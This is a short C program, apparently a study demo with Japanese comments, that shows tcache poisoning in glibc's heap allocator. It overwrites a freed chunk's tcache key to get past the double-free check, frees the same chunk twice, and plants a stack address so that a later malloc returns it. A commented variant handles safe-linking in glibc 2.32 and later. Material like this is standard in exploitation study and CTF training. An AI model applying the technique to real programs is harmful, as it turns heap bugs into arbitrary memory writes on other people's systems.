#include<stdio.h>
#include<stdlib.h>

int main(){
    int k;
    printf("k: %p\n", &k);

    char *a = (char *)malloc(0x18);
    char *b = (char *)malloc(0x18);
    printf("a: %p\n", a);
    printf("b: %p\n", b);
    free(a);
    free(b);

    *(unsigned long *)(b+0x8) = 0xdeadbeef;     // keyの書き換え

    // Double Free
    free(b);

    char *c = (char *)malloc(0x18);
    printf("c: %p\n", c);

    *(unsigned long *)c = (unsigned long)&k;
    // *(unsigned long *)c = ((unsigned long)c>>12) ^ ((unsigned long)&k+0x34); // 2.32以降

    char *d = (char *)malloc(0x18);
    char *e = (char *)malloc(0x18);
    printf("d: %p\n", d);
    printf("e: %p\n", e);
}